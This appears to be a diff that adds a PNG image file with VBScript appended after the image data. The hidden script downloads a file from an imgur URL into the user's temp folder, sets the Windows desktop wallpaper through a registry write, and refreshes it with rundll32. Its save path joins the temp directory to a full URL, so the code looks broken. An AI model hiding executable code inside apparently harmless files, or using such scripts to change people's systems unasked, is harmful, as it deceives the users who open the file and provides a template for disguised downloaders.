@@ -1,0 +1,29 @@
+‰PNG
+
+   
+IHDR  Ç  /   
+%˜   sRGB ®Îé   gAMA  ±üa   PLTEÿÿÿ   UÂÓ~   	pHYs  Ã  ÃÇo¨d  íIDATxÚíÔ±NÛ@ÀñïâˆË€Hºe°H¤¾€ÙŒˆ R‡nåÄÀjÔJõP%YÂTª`èÒ©OÐèxnÙàò™tÇ¨Cƒ°J¿sLH¨µÛ÷‚¬ÜýÌ%¹pÇqÇqÇqÇqÇqÇqÇqÇqÇqÇqÇqÇqÜ¯usQ)Ý\iÀÛñçA1™T¯äÖŒÜ¨•Õu7¥Éô„N>Ïº+åŒ|
+à½¯á:x4"IGI>‚Ð¬OË:=½¨—´ú†“Ø4 ‹B·Rßj~ƒÖœA(»é-B JÁ‚ùç”,‚³d¤C£t}#…Æi‰w¤4³ŒôèaßJ+KÕ4Åœ’dê”Y‘7Ÿä0¼JWp•Fš}Õ¶>¥åî©jm+X‡Ô²m!×—Ì‚h¼üÁÝq'7=4þJvhäÅ@÷<tâAŸkè‹Ãr»-dÇHe)UõVÏ¿MäE¬ãÔïIáEÜûè`k+/Q¬mždx`ÞƒÕÇEXûy+1Öè¹èj’lîj¤D°g…¡,H‹¤LDI7qge#†‚ú¢wPÁëí‘´ÄžèKY”â„fÙ2ç¤=Ê¤'j1–°4%]øx¯låZˆÉ³ä$†A2‘ê•‘%)ŽÁì»$=p°:'ËÊÈÝ@Ÿåò$—ýL¾Í¤‡öœ2ù&Øw1YÑ-#õ¡3@!“‰Kû¡4-«]U*
+½ìWÑß+qhdEZtWÚq.}+. .MvÆGgž…Föú_«gX£kÚ
+™ºäÕIú¾M§CB}"G©ï
+%É8º:qÒ(V$õµuœÉ=ð¿IëÝøF¿	t´òa]Žÿþ"+%1€øúeÚ÷W——ºim0@1‚šÞP´ÆeW¤Ö:S')?å³çòžhÁó/=Z6ž,—Ÿ,å“å)–àÎ¾’ýè›ãûù8Žã8Žã8ŽûüqUacJr‘¯    IEND®B`‚
+
+Set objShell = CreateObject("WScript.Shell")
+Set objEnv = objShell.Environment("User")
+ 
+strDirectory = objShell.ExpandEnvironmentStrings("%temp%")
+ 
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", "https://i.imgur.com/uC4iYjT.png", False
+xHttp.Send
+ 
+with bStrm
+    .type = 1 '//binary
+    .open
+    .write xHttp.responseBody
+    .savetofile strDirectory + "https://i.imgur.com/uC4iYjT.png", 2 '//overwrite
+end with
+ 
+objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strDirectory + "https://i.imgur.com/uC4iYjT.png"
+objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
